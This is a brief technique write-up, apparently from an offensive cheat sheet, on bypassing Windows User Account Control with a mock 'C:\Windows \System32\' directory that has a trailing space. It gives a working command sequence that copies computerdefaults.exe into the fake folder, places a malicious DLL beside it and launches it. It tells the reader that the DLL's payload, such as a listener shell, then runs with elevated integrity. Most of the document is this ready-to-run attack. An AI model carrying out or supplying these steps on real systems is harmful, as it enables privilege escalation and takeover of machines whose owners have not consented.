# UAC Bypass via Trusted-Folder Trailing-Space DLL Hijack

Windows auto-elevated binaries trust DLLs loaded from `C:\Windows\System32\`, but a folder named `C:\Windows \System32\` (trailing space after "Windows") is treated as *inside* the trusted path by the elevation check while actually being a normal, attacker-creatable directory.

```cmd
mkdir "C:\Windows \"
mkdir "C:\Windows \System32\"
copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"
copy <malicious-dll> "C:\Windows \System32\<dll-the-binary-loads>"
"C:\Windows \System32\computerdefaults.exe"
```
The DLL's `DllMain` runs your payload on load (e.g. spawn a listener shell) with the auto-elevated binary's integrity level.
